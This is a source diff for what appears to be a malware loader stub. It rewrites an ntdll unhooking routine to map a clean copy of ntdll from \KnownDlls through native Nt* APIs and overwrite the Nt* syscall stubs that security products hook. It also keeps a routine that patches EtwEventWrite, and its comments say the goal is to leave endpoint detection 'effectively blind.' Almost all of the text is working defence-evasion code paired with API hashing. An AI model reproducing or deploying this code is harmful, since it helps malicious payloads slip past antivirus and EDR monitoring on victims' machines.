@@ -314,10 +314,9 @@ static void _derive_key(const unsigned char *seed, unsigned int seedlen,
 #define H_NtOpenThread              0x121303C4
 #define H_NtUnmapViewOfSection      0x70A2530C
 
-/* Unhooking API hashes — ntdll clean-copy restoration */
-#define H_CreateFileMappingA        0xA1C573C3
-#define H_MapViewOfFile             0x447430C9
-#define H_UnmapViewOfFile           0x776D9A5A
+/* Unhooking API hashes — ntdll-only clean-copy restoration via \KnownDlls */
+#define H_NtOpenSection             0x8CD472F5
+#define H_NtClose                   0x8178E005
 
 /* ETW patching hash — blind EDR telemetry */
 #define H_EtwEventWrite             0x50EF17B1
@@ -498,96 +497,112 @@ typedef struct _RESOLVED_APIS {
 #endif
 } RESOLVED_APIS;
 
-/* Function pointer types needed by unhooking / ETW patching */
-typedef HANDLE (WINAPI *fnCreateFileA_u_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
-typedef BOOL   (WINAPI *fnCloseHandle_u_t)(HANDLE);
-typedef HANDLE (WINAPI *fnCreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
-typedef LPVOID (WINAPI *fnMapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
-typedef BOOL   (WINAPI *fnUnmapViewOfFile_t)(LPCVOID);
-
-/* Convert RVA to file offset using section table */
-static DWORD _rva_to_offset(IMAGE_SECTION_HEADER *secs, WORD nSecs, DWORD rva) {
-    for (WORD i = 0; i < nSecs; i++) {
-        DWORD va  = secs[i].VirtualAddress;
-        DWORD vsz = secs[i].Misc.VirtualSize;
-        if (rva >= va && rva < va + vsz)
-            return secs[i].PointerToRawData + (rva - va);
-    }
-    return 0;
-}
-
-/* Targeted ntdll unhooking — restore individual syscall stubs only.
+/* ═══════════════════════════════════════════════════════════════════
+ * ntdll unhooking — ZERO kernel32 dependency
  *
- * Full .text replacement can break things: Windows applies in-memory
- * hotfixes to ntdll that differ from the on-disk copy.  Overwriting
- * ALL of .text reverts those patches and silently corrupts networking
- * or CRT functions.
+ * Uses \KnownDlls\ntdll.dll section object (mapped by the kernel at
+ * boot) + ntdll-native APIs only.  This completely avoids the
+ * forwarded-export problem: kernel32 APIs like CreateFileMappingA,
+ * MapViewOfFile, CloseHandle are forwarded to kernelbase on Win10/11
+ * and _resolve_export() cannot follow forwarding — it returns a
+ * pointer to the forwarding STRING, calling it = instant crash.
  *
- * Instead we patch only the specific Nt* syscall stubs that EDRs hook.
- * Each stub is ~32 bytes; the rest of ntdll (including hotfixes) stays
- * untouched. */
+ * The KnownDlls section is an IMAGE mapping (same layout as loaded
+ * ntdll), so RVAs from the loaded copy can be used directly as
+ * offsets into the clean copy — no _rva_to_offset needed.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+/* Ntdll API typedefs for unhooking — all native, never forwarded */
+typedef NTSTATUS (NTAPI *fnNtOpenSection_t)(PHANDLE, ACCESS_MASK, PVOID /*POBJECT_ATTRIBUTES*/);
+typedef NTSTATUS (NTAPI *fnNtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *fnNtClose_t)(HANDLE);
+/* NtUnmapViewOfSection and NtProtectVirtualMemory already typedef'd via RESOLVED_APIS */
+typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection_t)(HANDLE, PVOID);
+
+/* Minimal OBJECT_ATTRIBUTES + UNICODE_STRING for NtOpenSection */
+typedef struct {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UHOOK_UNICODE_STRING;
+
+typedef struct {
+    ULONG  Length;
+    HANDLE RootDirectory;
+    UHOOK_UNICODE_STRING *ObjectName;
+    ULONG  Attributes;
+    PVOID  SecurityDescriptor;
+    PVOID  SecurityQualityOfService;
+} UHOOK_OBJECT_ATTRIBUTES;
+
 #define STUB_PATCH_SIZE 32   /* bytes to restore per syscall stub */
+#define OBJ_CASE_INSENSITIVE 0x00000040
 
-static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base, RESOLVED_APIS *api) {
-    /* Resolve file mapping APIs from kernel32 via GetProcAddress.
-     * CRITICAL: _resolve_export() does NOT handle forwarded exports.
-     * On Win10/11, CreateFileMappingA, MapViewOfFile, CloseHandle, etc.
-     * are forwarded from kernel32 → kernelbase.  _resolve_export returns
-     * a pointer to the forwarding STRING, calling it = instant crash.
-     * GetProcAddress follows the forwarding chain correctly. */
-    fnCreateFileA_u_t pCreateFileA =
-        (fnCreateFileA_u_t)api->pGetProcAddress((HMODULE)k32, "CreateFileA");
-    fnCloseHandle_u_t pCloseHandle =
-        (fnCloseHandle_u_t)api->pGetProcAddress((HMODULE)k32, "CloseHandle");
-    fnCreateFileMappingA_t pCreateFileMappingA =
-        (fnCreateFileMappingA_t)api->pGetProcAddress((HMODULE)k32, "CreateFileMappingA");
-    fnMapViewOfFile_t pMapViewOfFile =
-        (fnMapViewOfFile_t)api->pGetProcAddress((HMODULE)k32, "MapViewOfFile");
-    fnUnmapViewOfFile_t pUnmapViewOfFile =
-        (fnUnmapViewOfFile_t)api->pGetProcAddress((HMODULE)k32, "UnmapViewOfFile");
+static void _unhook_ntdll(BYTE *ntdll_base, RESOLVED_APIS *api) {
+    /* Resolve ntdll-only APIs — _resolve_export is safe for ntdll
+     * (ntdll never forwards exports to other DLLs) */
+    fnNtOpenSection_t pNtOpenSection =
+        (fnNtOpenSection_t)_resolve_export(ntdll_base, H_NtOpenSection);
+    fnNtMapViewOfSection_t pNtMapViewOfSection =
+        (fnNtMapViewOfSection_t)_resolve_export(ntdll_base, H_NtMapViewOfSection);
+    fnNtUnmapViewOfSection_t pNtUnmapViewOfSection =
+        (fnNtUnmapViewOfSection_t)_resolve_export(ntdll_base, H_NtUnmapViewOfSection);
+    fnNtClose_t pNtClose =
+        (fnNtClose_t)_resolve_export(ntdll_base, H_NtClose);
 
-    if (!pCreateFileA || !pCloseHandle || !pCreateFileMappingA ||
-        !pMapViewOfFile || !pUnmapViewOfFile || !api->pNtProtectVirtualMemory) {
-        SLOG("[stub] unhook: missing APIs — skipped");
+    if (!pNtOpenSection || !pNtMapViewOfSection ||
+        !pNtUnmapViewOfSection || !pNtClose ||
+        !api->pNtProtectVirtualMemory) {
+        SLOG("[stub] unhook: missing ntdll APIs — skipped");
         return;
     }
 
-    /* Open clean ntdll.dll from disk */
-    HANDLE hFile = pCreateFileA(
-        "C:\\Windows\\System32\\ntdll.dll",
-        GENERIC_READ, FILE_SHARE_READ, NULL,
-        OPEN_EXISTING, 0, NULL);
-    if (hFile == (HANDLE)-1) {
-        SLOG("[stub] unhook: CreateFileA failed");
+    /* Open \KnownDlls\ntdll.dll section object.
+     * The kernel pre-creates these at boot — no file I/O needed. */
+    WCHAR secName[] = L"\\KnownDlls\\ntdll.dll";
+    UHOOK_UNICODE_STRING uStr;
+    uStr.Length        = sizeof(secName) - sizeof(WCHAR);
+    uStr.MaximumLength = sizeof(secName);
+    uStr.Buffer        = secName;
+
+    UHOOK_OBJECT_ATTRIBUTES oa;
+    /* Zero without memset (no CRT) */
+    {
+        BYTE *p = (BYTE *)&oa;
+        for (unsigned i = 0; i < sizeof(oa); i++) p[i] = 0;
+    }
+    oa.Length     = sizeof(oa);
+    oa.ObjectName = &uStr;
+    oa.Attributes = OBJ_CASE_INSENSITIVE;
+
+    HANDLE hSection = NULL;
+    NTSTATUS status = pNtOpenSection(&hSection, 0x4 /*SECTION_MAP_READ*/, &oa);
+    if (!NT_SUCCESS(status)) {
+        SLOG("[stub] unhook: NtOpenSection failed");
         return;
     }
 
-    /* Map the file as data (NOT SEC_IMAGE — that would go through hooks) */
-    HANDLE hMap = pCreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_COMMIT,
-                                      0, 0, NULL);
-    if (!hMap) {
-        pCloseHandle(hFile);
-        SLOG("[stub] unhook: CreateFileMappingA failed");
+    /* Map the KnownDlls section — gives us a clean IMAGE-layout copy.
+     * ViewShare (1) so it doesn't affect the original loaded mapping. */
+    PVOID cleanBase = NULL;
+    SIZE_T viewSize = 0;
+    status = pNtMapViewOfSection(hSection, (HANDLE)-1, &cleanBase,
+                                  0, 0, NULL, &viewSize,
+                                  1 /*ViewShare*/, 0, PAGE_READONLY);
+    if (!NT_SUCCESS(status)) {
+        pNtClose(hSection);
+        SLOG("[stub] unhook: NtMapViewOfSection failed");
         return;
     }
 
-    BYTE *cleanNtdll = (BYTE *)pMapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-    if (!cleanNtdll) {
-        pCloseHandle(hMap);
-        pCloseHandle(hFile);
-        SLOG("[stub] unhook: MapViewOfFile failed");
-        return;
-    }
-
-    /* Parse clean copy to get section table for RVA-to-offset conversion */
+    /* Validate clean copy PE signature */
+    BYTE *cleanNtdll = (BYTE *)cleanBase;
     IMAGE_DOS_HEADER *cleanDos = (IMAGE_DOS_HEADER *)cleanNtdll;
     if (cleanDos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
     IMAGE_NT_HEADERS *cleanNt = (IMAGE_NT_HEADERS *)(cleanNtdll + cleanDos->e_lfanew);
     if (cleanNt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;
-    IMAGE_SECTION_HEADER *cleanSec = IMAGE_FIRST_SECTION(cleanNt);
-    WORD nSecs = cleanNt->FileHeader.NumberOfSections;
 
-    /* List of Nt* syscall stubs to unhook — covers the common EDR targets */
+    /* Patch targeted Nt* stubs */
     {
         static const DWORD targets[] = {
             H_NtAllocateVirtualMemory,
@@ -611,20 +626,15 @@ static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base, RESOLVED_APIS *api) {
             BYTE *hooked = (BYTE *)_resolve_export(ntdll_base, targets[t]);
             if (!hooked) continue;
 
-            /* Compute RVA and convert to file offset */
+            /* KnownDlls is IMAGE-layout → same RVA offset works directly */
             DWORD rva = (DWORD)(hooked - ntdll_base);
-            DWORD fileOff = _rva_to_offset(cleanSec, nSecs, rva);
-            if (!fileOff) continue;
-
-            BYTE *clean = cleanNtdll + fileOff;
+            BYTE *clean = cleanNtdll + rva;
 
             /* Check if the stub is actually hooked (first byte != 0x4C means
              * the normal mov r10,rcx was overwritten with a JMP/etc.) */
             if (hooked[0] == 0x4C) continue;  /* not hooked, skip */
 
-            /* Patch: make writable, copy clean stub, restore.
-             * Use NtProtectVirtualMemory (ntdll) instead of kernel32
-             * VirtualProtect to avoid the forwarded-export problem. */
+            /* Patch: make writable, copy clean stub, restore */
             ULONG oldProt;
             PVOID patchAddr = (PVOID)hooked;
             SIZE_T patchSize = STUB_PATCH_SIZE;
@@ -643,9 +653,8 @@ static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base, RESOLVED_APIS *api) {
     }
 
 cleanup:
-    pUnmapViewOfFile(cleanNtdll);
-    pCloseHandle(hMap);
-    pCloseHandle(hFile);
+    pNtUnmapViewOfSection((HANDLE)-1, cleanBase);
+    pNtClose(hSection);
 }
 
 
@@ -1246,24 +1255,25 @@ void _stub_entry(void) {
      * MUST happen BEFORE any Nt* calls (decrypt, alloc, load) so that
      * those calls go through clean, unhooked code paths.
      *
-     *   1. _unhook_ntdll: reads a clean copy of ntdll.dll from disk
-     *      and overwrites the loaded (hooked) .text section, removing
-     *      all EDR inline hooks.
+     *   1. _unhook_ntdll: maps a clean copy from \KnownDlls\ntdll.dll
+     *      and restores individual Nt* syscall stubs, removing EDR
+     *      inline hooks.  Uses ONLY ntdll APIs (NtOpenSection,
+     *      NtMapViewOfSection, etc.) — zero kernel32 dependency.
      *
      *   2. _patch_etw: patches EtwEventWrite to immediately return 0,
      *      silencing the ETW telemetry pipeline that feeds EDR sensors.
+     *      Uses NtProtectVirtualMemory — zero kernel32 dependency.
      *
-     * Both use kernel32 file/memory APIs (unhhooked by EDR) to perform
-     * the patching. After this point the EDR is effectively blind to
-     * our ntdll-level operations.
+     * Both use ntdll-only APIs to avoid the forwarded-export crash
+     * (kernel32 APIs like CreateFileMappingA are forwarded to kernelbase
+     * on Win10/11; _resolve_export can't follow forwarding).
      */
 #if EVASION_UNHOOK || EVASION_ETW
     {
-        BYTE *k32   = _find_module(H_KERNEL32);
         BYTE *ntdll = _find_module(H_NTDLL);
-        if (k32 && ntdll) {
+        if (ntdll) {
 #if EVASION_UNHOOK
-            _unhook_ntdll(k32, ntdll, &api);
+            _unhook_ntdll(ntdll, &api);
 #endif
 #if EVASION_ETW
             _patch_etw(ntdll, &api);
